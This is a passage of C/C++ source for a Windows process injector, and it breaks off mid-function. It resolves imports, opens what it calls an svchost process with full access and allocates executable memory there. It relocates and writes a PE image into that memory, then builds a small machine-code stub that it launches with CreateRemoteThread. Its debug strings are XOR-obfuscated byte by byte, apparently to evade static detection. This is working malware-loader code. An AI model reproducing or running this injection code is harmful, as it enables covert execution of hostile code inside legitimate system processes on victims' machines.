				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 116; _fuckingstring[2] = 111; _fuckingstring[3] = 98; _fuckingstring[4] = 117; _fuckingstring[5] = 104; _fuckingstring[6] = 110; _fuckingstring[7] = 111; _fuckingstring[8] = 33; _fuckingstring[9] = 111; _fuckingstring[10] = 96; _fuckingstring[11] = 108; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 104; _fuckingstring[15] = 114; _fuckingstring[16] = 59; _fuckingstring[17] = 33; _fuckingstring[18] = 36; _fuckingstring[19] = 114; _fuckingstring[20] = 11; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
				printf(_fuckingstring, ((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);

#endif // jinyongyutiaoshi



				DWORD64 _____ashdjoajoidais = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);



#ifdef jinyongyutiaoshi

				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 117; _fuckingstring[1] = 105; _fuckingstring[2] = 104; _fuckingstring[3] = 114; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 103; _fuckingstring[13] = 116; _fuckingstring[14] = 111; _fuckingstring[15] = 98; _fuckingstring[16] = 117; _fuckingstring[17] = 104; _fuckingstring[18] = 110; _fuckingstring[19] = 111; _fuckingstring[20] = 33; _fuckingstring[21] = 96; _fuckingstring[22] = 101; _fuckingstring[23] = 101; _fuckingstring[24] = 115; _fuckingstring[25] = 100; _fuckingstring[26] = 114; _fuckingstring[27] = 114; _fuckingstring[28] = 33; _fuckingstring[29] = 115; _fuckingstring[30] = 100; _fuckingstring[31] = 117; _fuckingstring[32] = 115; _fuckingstring[33] = 104; _fuckingstring[34] = 100; _fuckingstring[35] = 119; _fuckingstring[36] = 100; _fuckingstring[37] = 33; _fuckingstring[38] = 103; _fuckingstring[39] = 115; _fuckingstring[40] = 110; _fuckingstring[41] = 108; _fuckingstring[42] = 33; _fuckingstring[43] = 98; _fuckingstring[44] = 116; _fuckingstring[45] = 115; _fuckingstring[46] = 115; _fuckingstring[47] = 100; _fuckingstring[48] = 111; _fuckingstring[49] = 117; _fuckingstring[50] = 33; _fuckingstring[51] = 113; _fuckingstring[52] = 115; _fuckingstring[53] = 110; _fuckingstring[54] = 98; _fuckingstring[55] = 100; _fuckingstring[56] = 114; _fuckingstring[57] = 114; _fuckingstring[58] = 38; _fuckingstring[59] = 114; _fuckingstring[60] = 33; _fuckingstring[61] = 106; _fuckingstring[62] = 100; _fuckingstring[63] = 115; _fuckingstring[64] = 111; _fuckingstring[65] = 100; _fuckingstring[66] = 109; _fuckingstring[67] = 50; _fuckingstring[68] = 51; _fuckingstring[69] = 47; _fuckingstring[70] = 101; _fuckingstring[71] = 109; _fuckingstring[72] = 109; _fuckingstring[73] = 59; _fuckingstring[74] = 33; _fuckingstring[75] = 36; _fuckingstring[76] = 113; _fuckingstring[77] = 11; _fuckingstring[78] = 1; FBXorCrypt(_fuckingstring, 79);
				printf(_fuckingstring, reinterpret_cast<BYTE*>(_____ashdjoajoidais));

#endif // jinyongyutiaoshi

				DWORD64 _tempoppapsdjioasdjhoiasjda = _____ashdjoajoidais - uiLibraryAddress + _target_process_kernel32_base_addr;

#ifdef jinyongyutiaoshi

				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 117; _fuckingstring[1] = 105; _fuckingstring[2] = 104; _fuckingstring[3] = 114; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 103; _fuckingstring[13] = 116; _fuckingstring[14] = 111; _fuckingstring[15] = 98; _fuckingstring[16] = 117; _fuckingstring[17] = 104; _fuckingstring[18] = 110; _fuckingstring[19] = 111; _fuckingstring[20] = 33; _fuckingstring[21] = 96; _fuckingstring[22] = 101; _fuckingstring[23] = 101; _fuckingstring[24] = 115; _fuckingstring[25] = 100; _fuckingstring[26] = 114; _fuckingstring[27] = 114; _fuckingstring[28] = 33; _fuckingstring[29] = 96; _fuckingstring[30] = 103; _fuckingstring[31] = 117; _fuckingstring[32] = 100; _fuckingstring[33] = 115; _fuckingstring[34] = 33; _fuckingstring[35] = 103; _fuckingstring[36] = 104; _fuckingstring[37] = 121; _fuckingstring[38] = 100; _fuckingstring[39] = 101; _fuckingstring[40] = 33; _fuckingstring[41] = 104; _fuckingstring[42] = 111; _fuckingstring[43] = 33; _fuckingstring[44] = 117; _fuckingstring[45] = 96; _fuckingstring[46] = 115; _fuckingstring[47] = 102; _fuckingstring[48] = 100; _fuckingstring[49] = 117; _fuckingstring[50] = 33; _fuckingstring[51] = 113; _fuckingstring[52] = 115; _fuckingstring[53] = 110; _fuckingstring[54] = 98; _fuckingstring[55] = 100; _fuckingstring[56] = 114; _fuckingstring[57] = 114; _fuckingstring[58] = 59; _fuckingstring[59] = 33; _fuckingstring[60] = 36; _fuckingstring[61] = 113; _fuckingstring[62] = 11; _fuckingstring[63] = 1; FBXorCrypt(_fuckingstring, 64);
				printf(_fuckingstring, reinterpret_cast<BYTE*>(_tempoppapsdjioasdjhoiasjda));

#endif // jinyongyutiaoshi

				* reinterpret_cast<DWORD64*>(uiValueA) = _tempoppapsdjioasdjhoiasjda;

			}

			// get the next imported function

			uiValueA += sizeof(ULONG_PTR);

			if (uiValueD)

				uiValueD += sizeof(ULONG_PTR);

		}



		// get the next import

		uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);

	}



	// STEP 5: process all of our images relocations...

	// 



	// calculate the base address delta and perform relocations (even if we load at desired image base)

	// daltadelta





	HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, _svchost_1_pid);

	if (!hw)

	{

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 79; _fuckingstring[9] = 110; _fuckingstring[10] = 117; _fuckingstring[11] = 33; _fuckingstring[12] = 103; _fuckingstring[13] = 110; _fuckingstring[14] = 116; _fuckingstring[15] = 111; _fuckingstring[16] = 101; _fuckingstring[17] = 33; _fuckingstring[18] = 41; _fuckingstring[19] = 49; _fuckingstring[20] = 121; _fuckingstring[21] = 36; _fuckingstring[22] = 109; _fuckingstring[23] = 89; _fuckingstring[24] = 40; _fuckingstring[25] = 11; _fuckingstring[26] = 1; FBXorCrypt(_fuckingstring, 27);
		printf(_fuckingstring, GetLastError());

		return -1;

	}

	void* _real_base_in_target_process = VirtualAllocEx(hw, NULL, _memeoy_size_to_be_allocated_in_target_process, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);



	// 	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

	uiLibraryAddress = reinterpret_cast<DWORD64>(_real_base_in_target_process) - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;



	// uiValueB = the address of the relocation directory

	// .reloc

	uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];



	// check if their are any relocations present

	if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size)

	{

		// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)

		uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);



		// and we itterate through all entries...

		while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock)

		{

#ifdef jinyongyutiaoshi

			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 114; _fuckingstring[1] = 123; _fuckingstring[2] = 104; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 110; _fuckingstring[6] = 103; _fuckingstring[7] = 33; _fuckingstring[8] = 99; _fuckingstring[9] = 109; _fuckingstring[10] = 110; _fuckingstring[11] = 98; _fuckingstring[12] = 106; _fuckingstring[13] = 33; _fuckingstring[14] = 104; _fuckingstring[15] = 111; _fuckingstring[16] = 33; _fuckingstring[17] = 115; _fuckingstring[18] = 100; _fuckingstring[19] = 109; _fuckingstring[20] = 110; _fuckingstring[21] = 98; _fuckingstring[22] = 33; _fuckingstring[23] = 100; _fuckingstring[24] = 111; _fuckingstring[25] = 117; _fuckingstring[26] = 115; _fuckingstring[27] = 120; _fuckingstring[28] = 59; _fuckingstring[29] = 33; _fuckingstring[30] = 49; _fuckingstring[31] = 121; _fuckingstring[32] = 36; _fuckingstring[33] = 113; _fuckingstring[34] = 11; _fuckingstring[35] = 1; FBXorCrypt(_fuckingstring, 36);
			printf(_fuckingstring, reinterpret_cast<BYTE*>(((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock));

#endif // jinyongyutiaoshi

			// uiValueA = the VA for this relocation block

			uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);



			// uiValueB = number of entries in this relocation block

			// entry

			uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);



			// uiValueD is now the first entry in the current relocation block

			// entry

			DWORD64	uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);



			// we itterate through all the entries in the current block...

			// entry

			while (uiValueB--)

			{

				// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.

				// IMAGE_REL_BASED_ABSOLUTEpadding

				// we dont use a switch statement to avoid the compiler building a jump table

				// which would not be very position independent!

				if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64) {



#ifdef jinyongyutiaoshi

					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 99; _fuckingstring[1] = 96; _fuckingstring[2] = 114; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 115; _fuckingstring[6] = 100; _fuckingstring[7] = 109; _fuckingstring[8] = 110; _fuckingstring[9] = 98; _fuckingstring[10] = 33; _fuckingstring[11] = 110; _fuckingstring[12] = 103; _fuckingstring[13] = 103; _fuckingstring[14] = 114; _fuckingstring[15] = 100; _fuckingstring[16] = 117; _fuckingstring[17] = 59; _fuckingstring[18] = 33; _fuckingstring[19] = 49; _fuckingstring[20] = 121; _fuckingstring[21] = 36; _fuckingstring[22] = 113; _fuckingstring[23] = 11; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
					printf(_fuckingstring, reinterpret_cast<BYTE*>(((PIMAGE_RELOC)uiValueD)->offset));

					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 96; _fuckingstring[1] = 103; _fuckingstring[2] = 117; _fuckingstring[3] = 100; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 96; _fuckingstring[7] = 101; _fuckingstring[8] = 101; _fuckingstring[9] = 33; _fuckingstring[10] = 117; _fuckingstring[11] = 110; _fuckingstring[12] = 33; _fuckingstring[13] = 115; _fuckingstring[14] = 100; _fuckingstring[15] = 109; _fuckingstring[16] = 110; _fuckingstring[17] = 98; _fuckingstring[18] = 33; _fuckingstring[19] = 99; _fuckingstring[20] = 109; _fuckingstring[21] = 110; _fuckingstring[22] = 98; _fuckingstring[23] = 106; _fuckingstring[24] = 33; _fuckingstring[25] = 99; _fuckingstring[26] = 96; _fuckingstring[27] = 114; _fuckingstring[28] = 100; _fuckingstring[29] = 59; _fuckingstring[30] = 33; _fuckingstring[31] = 49; _fuckingstring[32] = 121; _fuckingstring[33] = 36; _fuckingstring[34] = 113; _fuckingstring[35] = 11; _fuckingstring[36] = 1; FBXorCrypt(_fuckingstring, 37);
					printf(_fuckingstring, reinterpret_cast<BYTE*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset));

					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 105; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 119; _fuckingstring[13] = 96; _fuckingstring[14] = 109; _fuckingstring[15] = 116; _fuckingstring[16] = 100; _fuckingstring[17] = 33; _fuckingstring[18] = 104; _fuckingstring[19] = 111; _fuckingstring[20] = 33; _fuckingstring[21] = 104; _fuckingstring[22] = 117; _fuckingstring[23] = 45; _fuckingstring[24] = 33; _fuckingstring[25] = 69; _fuckingstring[26] = 86; _fuckingstring[27] = 78; _fuckingstring[28] = 83; _fuckingstring[29] = 69; _fuckingstring[30] = 55; _fuckingstring[31] = 53; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 113; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
					printf(_fuckingstring, reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));

#endif // jinyongyutiaoshi

					// delta

					* (ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;

#ifdef jinyongyutiaoshi

					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 105; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 119; _fuckingstring[13] = 96; _fuckingstring[14] = 109; _fuckingstring[15] = 116; _fuckingstring[16] = 100; _fuckingstring[17] = 33; _fuckingstring[18] = 96; _fuckingstring[19] = 103; _fuckingstring[20] = 117; _fuckingstring[21] = 100; _fuckingstring[22] = 115; _fuckingstring[23] = 33; _fuckingstring[24] = 103; _fuckingstring[25] = 104; _fuckingstring[26] = 121; _fuckingstring[27] = 100; _fuckingstring[28] = 101; _fuckingstring[29] = 33; _fuckingstring[30] = 116; _fuckingstring[31] = 113; _fuckingstring[32] = 33; _fuckingstring[33] = 45; _fuckingstring[34] = 33; _fuckingstring[35] = 69; _fuckingstring[36] = 86; _fuckingstring[37] = 78; _fuckingstring[38] = 83; _fuckingstring[39] = 69; _fuckingstring[40] = 55; _fuckingstring[41] = 53; _fuckingstring[42] = 59; _fuckingstring[43] = 33; _fuckingstring[44] = 49; _fuckingstring[45] = 121; _fuckingstring[46] = 36; _fuckingstring[47] = 113; _fuckingstring[48] = 11; _fuckingstring[49] = 1; FBXorCrypt(_fuckingstring, 50);
					printf(_fuckingstring, reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));

#endif // jinyongyutiaoshi

				}

				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)

					*(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;



				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH)

					*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);

				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW)

					*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);



				// get the next entry in the current relocation block

				uiValueD += sizeof(IMAGE_RELOC);

			}



			// get the next entry in the relocation directory

			uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;

		}

	}



	// PE



	if (!WriteProcessMemory(hw, _real_base_in_target_process, reinterpret_cast<VOID*>(_pe_addr_load_in_current_process), _memeoy_size_to_be_allocated_in_target_process, NULL))

	{

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
		printf(_fuckingstring, (unsigned int)GetLastError());

		exit(-1);

	}



	//

	//	uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);

	uiValueA = (reinterpret_cast<DWORD64>(_real_base_in_target_process) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 117; _fuckingstring[1] = 105; _fuckingstring[2] = 104; _fuckingstring[3] = 114; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 100; _fuckingstring[13] = 111; _fuckingstring[14] = 117; _fuckingstring[15] = 115; _fuckingstring[16] = 120; _fuckingstring[17] = 33; _fuckingstring[18] = 113; _fuckingstring[19] = 110; _fuckingstring[20] = 104; _fuckingstring[21] = 111; _fuckingstring[22] = 117; _fuckingstring[23] = 33; _fuckingstring[24] = 104; _fuckingstring[25] = 111; _fuckingstring[26] = 33; _fuckingstring[27] = 117; _fuckingstring[28] = 96; _fuckingstring[29] = 115; _fuckingstring[30] = 102; _fuckingstring[31] = 100; _fuckingstring[32] = 117; _fuckingstring[33] = 33; _fuckingstring[34] = 113; _fuckingstring[35] = 115; _fuckingstring[36] = 110; _fuckingstring[37] = 98; _fuckingstring[38] = 100; _fuckingstring[39] = 114; _fuckingstring[40] = 114; _fuckingstring[41] = 59; _fuckingstring[42] = 33; _fuckingstring[43] = 49; _fuckingstring[44] = 121; _fuckingstring[45] = 36; _fuckingstring[46] = 113; _fuckingstring[47] = 11; _fuckingstring[48] = 1; FBXorCrypt(_fuckingstring, 49);
	printf(_fuckingstring, reinterpret_cast<BYTE*>(uiValueA));



	// alignrspcallalign rsp



	// align rsp



	void* _2_29bytes = VirtualAllocEx(hw, NULL, 29, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	BYTE _fuckyou1[12] = { 0x56,0x48,0x8B,0xF4,0x48,0x83,0xE4,0xF0,0x48,0x83,0xEC,0x20 };

	if (!WriteProcessMemory(hw, _2_29bytes, _fuckyou1, 12, NULL))

	{

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
		printf(_fuckingstring, (unsigned int)GetLastError());

		exit(-1);

	}

	// mov rax, .....

	BYTE caonimadwozhendefue[2] = { 0x48,0xb8 };

	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12, caonimadwozhendefue, 2, NULL))

	{

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
		printf(_fuckingstring, (unsigned int)GetLastError());

		exit(-1);

	}

	//  8bytes

	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2, &uiValueA, 8, NULL))

	{

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
		printf(_fuckingstring, (unsigned int)GetLastError());

		exit(-1);

	}

	// call rax

	BYTE _CAL_RAX[2] = { 0xFF, 0xD0 };

	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8, _CAL_RAX, 2, NULL))

	{

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
		printf(_fuckingstring, (unsigned int)GetLastError());

		exit(-1);

	}



	BYTE _CAL_RA___RET_X[5] = { 0x48, 0x8b, 0xe6, 0x5e, 0xc3 };

	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8 + 2, _CAL_RA___RET_X, 5, NULL))

	{

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
		printf(_fuckingstring, (unsigned int)GetLastError());

		exit(-1);

	}



	//   _2_29bytes

	//HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, _svchost_1_pid);

	//if (!hw)

	//{

	//	printf("Process Not found (0x%lX)\n", GetLastError());

	//		return -1;

		//}

		/*void* base = VirtualAllocEx(hw, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (!base)

		{

			CloseHandle(hw);

			return -1;

		}

		if (!WriteProcessMemory(hw, base, byteArray, fileSize, NULL))

		{

	MYS_ecureZeroMemory((char*)_fuckingstring,100);_fuckingstring[0]=118;_fuckingstring[1]=115;_fuckingstring[2]=104;_fuckingstring[3]=117;_fuckingstring[4]=100;_fuckingstring[5]=33;_fuckingstring[6]=113;_fuckingstring[7]=115;_fuckingstring[8]=110;_fuckingstring[9]=98;_fuckingstring[10]=100;_fuckingstring[11]=114;_fuckingstring[12]=114;_fuckingstring[13]=33;_fuckingstring[14]=108;_fuckingstring[15]=100;_fuckingstring[16]=108;_fuckingstring[17]=110;_fuckingstring[18]=115;_fuckingstring[19]=120;_fuckingstring[20]=33;_fuckingstring[21]=103;_fuckingstring[22]=96;_fuckingstring[23]=104;_fuckingstring[24]=109;_fuckingstring[25]=101;_fuckingstring[26]=33;_fuckingstring[27]=41;_fuckingstring[28]=49;_fuckingstring[29]=121;_fuckingstring[30]=36;_fuckingstring[31]=109;_fuckingstring[32]=89;_fuckingstring[33]=40;_fuckingstring[34]=11;_fuckingstring[35]=1;FBXorCrypt(_fuckingstring, 36);
			printf(_fuckingstring, GetLastError());

			CloseHandle(hw);

			return -1;

		}*/

		//	MessageBoxA(NULL, "OK", "OK", MB_OK);

	HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)_2_29bytes, NULL, 0, 0);

	if (!thread)

	{

